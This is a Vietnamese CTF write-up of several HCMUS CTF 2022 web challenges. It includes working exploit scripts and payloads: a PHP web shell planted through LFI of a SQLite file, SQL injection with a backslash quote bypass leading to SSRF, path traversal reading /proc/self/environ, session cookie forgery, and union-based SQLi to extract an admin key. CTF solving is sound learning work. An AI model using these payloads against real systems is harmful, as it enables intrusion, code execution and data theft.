---
title: HCMUS CTF 2022 Quals
tags: CTF
categories: CTF
toc: true
---

# Challenge URL Storing
### Phân tích code
Sử dụng LFI để get source bằng tham số `page`

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=view.php
php://filter/convert.base64-encode/resource=store.php
```
File `index.php`
```php
<?php
    error_reporting(0);
    session_start();
    $main = true;
    if (!isset($_SESSION['db'])) {
        $db = '/db/' . session_id() . ".db";
        $_SESSION['db'] = $db;
        $init = true;
    }
    else {
        $db = $_SESSION['db'];
        $init = false;
    }
    $pdo = new PDO("sqlite:" . getcwd() . $db);
    if ($init) {
        $pdo->exec("CREATE TABLE img (user_url string);");
    }
    if (!isset($_GET["page"]))
        die(header("Location: index.php?page=view.php")); 
    $page = $_GET["page"];
    if (stripos($page, "..") !== false || substr($page, 0, 1) == "/") {
        die("Hack detected");
    }
    include($page);
?>
```
- `$_SESSION['db']` được gắn bằng `/db/[session_id].db` => mình có thể control được cái này vì `session_id` là những thứ mình nhâp sau cookie `PHPSESSID`
- File `db` sẽ nằm ở `/var/www/html/db/[session_id].db`. Cấu trúc của db này có 1 table `img` với 1 column `user_url`
- Có thể LFI ở tham số `page`, bypass chỗ if bằng `file://`

File `store.php`

```php
<?php
    error_reporting(0);
    if (!isset($main)) {
        die("Hack detected");
    }
    if (isset($_POST["url"])) {
        $url = $_POST["url"];
        if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
            die('Not a valid URL');
        }
        $stmt = $pdo->prepare("INSERT INTO img VALUES (?)");
        $stmt->execute([$url]);
    }

?>
```
- Check `url` truyền vào có hợp lệ hay không
- `url` sẽ được lưu vô table `img`

### IDEA
- Sau khi nhập `url` thì sẽ được lưu vô db. Chúng ta có thể biết được filename của db và vị trí lưu của file này.
- Nhập url là 1 đoạn code php => code php sẽ được lưu trong file db
- Sử dụng LFI để execute file db nằm ở `/var/www/html/db/[session_id].db`

### Payload

```python
import requests

URL = 'http://103.245.250.31:32184'
CMD = 'cat /71c99-flag-e9c94.txt'

def upShell():
    data = {'url':'http://caheo/<?=system($_GET[0]);?>'}
    r = requests.post(URL+'/index.php?page=store.php',data=data)
    return r.cookies['PHPSESSID']

def getFlag():
    sessid = upShell()
    params = {"page":f"file:///var/www/html/db/{sessid}.db","0":CMD}
    r = requests.get(URL,params=params)
    print(r.text)

getFlag()
```

# Challenge No BackEnd

### Unintended
Flag nằm trong file `http://103.245.250.31:32323/js/chunk-851c22b0.e53301b2.js`

![](https://i.imgur.com/tpoxwJ5.png)

### Intended
Dù register thành công nhưng login thì sẽ không được. Mình sẽ nói một số đoạn code liên quan ở dưới đây:

File `src/app/main.js` trong `webpack`

```javascript
function getCookie (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  return (parts.length >= 2)
}
router.beforeEach((to, from, next) => {
  store.commit('setLoading', true)
  if (to.matched.some((record) => record.meta.guest)) {
    next()
  } else {
    if (!store.getters.isAuthenticated || !getCookie('token')) {
      next('/auth/login')
      return
    }
  
    next()
  }
})
```
- Check `isAuthenticated` nếu là `true` với function `getCookie` trả về `true` thì sẽ qua được login
- Điều kiện của `getCookie` để trả về `true` thì dễ. Chỉ cần thêm 1 cookie `token=abc` (value >= 2) là được.
- Giờ vấn đề là cần set `isAuthenticated` thành true thì mới vô được login, đặt breakpoint và debug thì thấy được nó được set mặc định là false.

![](https://i.imgur.com/OgV07Om.png)

Tiếp tục vô xem file `getters.js` ở `src/store/getters.js`
![](https://i.imgur.com/p8PNPYB.png)
Đặt breakpoint ở dòng này nó sẽ tự động nhảy đến 
![](https://i.imgur.com/KwinxGF.png)
Tiếp tục xem `T` sẽ được gọi ở đâu, trace một lúc thì sẽ thấy được `isAuthenticated` sẽ được gán bằng return của `T`
![](https://i.imgur.com/gmRGcip.png)
=> Set `e.app.user = true` và `document.cookie="token=abc"` cuối cùng `f8` để run script thì sẽ login thành công.
![](https://i.imgur.com/0eyYtIM.png)

Chat `flag` để nhận flag
![](https://i.imgur.com/6Ish1Qh.png)

# Challenge ShopcuteV3
### Phân tích code
File `login.php`

```php
<?php
    include("config.php");
    session_start();
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        try {            
            if (preg_match("/'|\"/", $_POST['username']) || preg_match("/'|\"/", $_POST['password']))
                die("Làm ơn đừng hack 😵😵😵");
            $sql = "select username, path from users where username='" .$_POST['username'] ."' and password='" .$_POST['password'] ."'";
            $sth = $conn->query($sql);
            $sth->setFetchMode(PDO::FETCH_ASSOC);
            if ($sth->rowCount() > 0){
                $row = $sth->fetch();
                {
                    $_SESSION['username'] = $row['username'];
                    $_SESSION['api_path'] = $row['path']; 
                    die(header("location: shopping.php"));
                }
            }
            else {
                $message = "Sai tên và mật khẩu rồi 😅";
            }
        } catch(PDOException $e) {
            $message =  "Ôi không, có gì đó sai sai. Hãy thử lại vào lúc khác nha 😅";
        }
    }
    if (isset($_SESSION['username']))
        die(header("location: shopping.php"));
    ?>
```
- Có thể SQLi ở `username` và `password`
- Chương trình có check một số kí tự `'`,`"` khỏi escape để SQLi nhưng ở đây có thể bypass bằng `\`
- `$_SESSION['username']` và `$_SESSION['api_path']` sẽ được gán bằng giá trị trả về của `$row['username'` và `$row['path']` tương ứng
File `flag.php`

```php
<?php
    header('Content-Type: application/json');
    $response = new stdClass();
    $response->status_code = 403;
    $response->msg = "Error 403 forbidden, can only access by 127.0.0.1";
    if ($_SERVER['REMOTE_ADDR'] === "127.0.0.1") {
        $response->msg = getenv("FLAG");
        $response->status_code = 200;
    }
    echo json_encode($response);
?>
```
- Phải đăng nhập từ `127.0.0.1` thì reponse trả về sẽ là flag được lấy từ biến FLAG nằm trong `enviroment`
- Ở đây có thể đoán được là cần SSRF để truy cập vô đây
File `shopping.php`

```php
<?php
include("config.php");
session_start();
if (!isset($_SESSION['username']))
    die(header("location: login.php"));

$items_img = json_decode(file_get_contents(BASE_API_URL . "/items.json"))->{"msg"};
$items = json_decode(file_get_contents(BASE_API_URL . $_SESSION["api_path"] . "/items.json"))->{"msg"};

$items_img = (array)$items_img;
$items = (array)$items;

?>
```
- `BASE_API_URL` được set là `http://shop-api:8080` trong file `config.php`
- `file_get_contents` đọc file `/items.json`
- `file_get_contents` cũng đọc file `/items.json` nhưng trước nó là 1 đường dẫn khác đó là `$_SESSION["api_path"]`

### IDEA
- Đầu tiên, chúng ta có SQLi ở login
- Cần SSRF để truy cập từ localhost vô `/flag.txt` để get flag
- File `shopping.php` có sử dụng hàm `file_get_contents` => có thể lợi dụng funtion này để SSRF
- Ở `file_get_contents` thứ 2 có chứa `$_SESSION["api_path]` mà chúng ta có thể control được => sử dụng SQLi tạo `api_path` theo ý mình muốn

### Payload
```
username=\&password= union select 1,0x403132372e302e302e312f666c61672e70687023-- -
```

# Challenge SecureNote
### Phân tích code
File `setup_flag.py`
```python
import requests
import secrets
import time

URL = 'http://127.0.0.1:8000'
USERNAME = "admin"
PASSWORD = '###REDACTED###'
SECRETKEY = '###REDACTED###'

print('[+] Working...')

time.sleep(10)

s = requests.Session()

r = s.post(URL + '/register', data={
    'username': USERNAME,
    'password': PASSWORD,
    'repassword': PASSWORD,
    'secretkey': SECRETKEY,
})

s.post(URL + '/login', data={
    'username': USERNAME,
    'password': PASSWORD,
})

s.post(URL + '/write_note', data={
    'title': 'Flag hereeeeee',
    'content': open('flag.txt', 'r').read(),
})

print('[+] Setup flag done!')
```
- File này cho biết được flag nằm ở note của account `admin`

File `app.py`
```python
[TRUNCATED]
@app.route('/read_note', methods=['GET'])
def read_note():
	filename = request.args.get('filename')
	f = open("notes/" + filename, 'r')
	content = f.read()
	f.close()
	try:
		content = AESCipher(bytes.fromhex(session['secret_key'])).decrypt(content.encode()).decode()
	except:
		print('Decrypt error')
	return render_template('read_note.html', content=content)
```
- Có thể control được filename => `path traversal` ở đây đọc file tùy ý

```python
@app.route('/register', methods=['GET', 'POST'])
def register():
    [TRUNCATED]
    
    if is_valid == True:
        username = waf_filter(username)
        secretkey = waf_filter(secretkey)
        cursor = mysql.connection.cursor()
        cursor.execute(f"select * from users where username='{username}'")
        if len(cursor.fetchall()) > 0:
            flash('Username already exists', 'error')
        else:
            md5_password = hashlib.md5(password.encode()).hexdigest()
            cursor.execute(f"insert into users(username, password, secret_key) values ('{username}', '{md5_password}', '{secretkey}')")
            flash('Registered successfully', 'success')
    return redirect('/register')
```
- Check `username` và `secretkey` qua hàm `waf_filter` ở trong file `utils/security`
- `password` đưa sau trước khi insert sẽ được hash md5

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
	if request.method == 'GET':
		return render_template('login.html')
	elif request.method == 'POST':
		username = waf_filter(request.form['username'])
		password = request.form['password']
		cursor = mysql.connection.cursor()
		cursor.execute(f"select * from users where username='{username}'")
		rv = cursor.fetchall()
		if len(rv) == 0:
			flash('User not found')
		else:
			md5_password = hashlib.md5(password.encode()).hexdigest()
			if rv[0][2] == md5_password:
				session['username'] = username
				session['secret_key'] = rv[0][3]
				return redirect('/')
			flash('Wrong password')
		return redirect('/login')
```
- Login thì chỉ check `username` qua hàm `waf_filter`, `password` thì sẽ được md5 và so sánh với md5 tron database.

Tóm lại:
- Biết được `flag` nằm trong `note` của account `admin`
- password của các user đăng kí đều được hash `md5` kể cả password của `admin`
- Có 4 chỗ để sqli `/write_note`, `/notes`, `/register`, `/login`
- Có thể `path traversal` để đọc file

### IDEA
- Sử dụng `path traversal` để đọc file `environment`, khi đó sẽ lấy được `SECRET_KEY` => crarf lại session `admin` => truy cập vô `admin` lấy `flag`. flag đang bị encrypt `AES`
- Biết được `secret_key` lưu trong `db` tại account `admin` được sử dụng để decrypt => sqli để lấy `secret_key`
- Bypass `waf_filter` bằng array. Mình nhớ trong function này check `'"\` và 1 số kí tự khác bằng cách loop => có thể bypass bằng array

### Payload
- Đọc `environment` để lấy `SECRET_KEY` => `../../../../../proc/self/environ`
- Craft cookie `username=admin` để vô lấy chuỗi `flag` bị encrypt
- Craft cookie với username là ``[" ' union select 1,2,(select secret_key from users where username='admin'),4,5-- -"]`` => lấy được `secret_key` để decrypt
- Sử dụng lại code decrypt của tác giả để decrypt flag

# Challenge No Frontend

### Payload
```python
import string
from random import choices
import requests

URL = 'http://103.245.250.31:32322'

def random_passwd(N:int)->str:
      return ''.join(choices(string.ascii_letters + string.digits,k=N))

def register(username,password):
    json = {'uname':username,'pwd':password}
    r = requests.post(URL+'/auth/register', json=json)
    print(r.text)

def login(username,password):
    json = {'uname':username,'pwd':password}
    r = requests.post(URL+'/auth/login',json=json)
    return r.headers["Set-Cookie"].split('=')[1]

def insert(key,data,token):
    json = {"key":key,"data":data}
    cookies = {"token":token}
    r = requests.post(URL+'/api/insert-data',json=json, cookies=cookies)
    return r.json()['data']

def getData(key,Signature,token):
    json = {"key":key}
    cookies = {"token":token}
    headers = {"Signature":Signature}
    r = requests.post(URL+'/api/data', json=json, headers=headers,cookies=cookies)
    return r.text

def main():
    password = random_passwd(6)
    register("adm",password)
    register("admin_1",password)
    token_admin_1 = login("admin_1",password)
    print(token_admin_1)
    token_admin_ = login("adm",password)
    print(token_admin_)
    Signature = insert("in_1key","caheo",token_admin_)
    print(Signature)
    data = getData("key",Signature, token_admin_1)
    print(data)

if __name__ == '__main__':
    main()
```
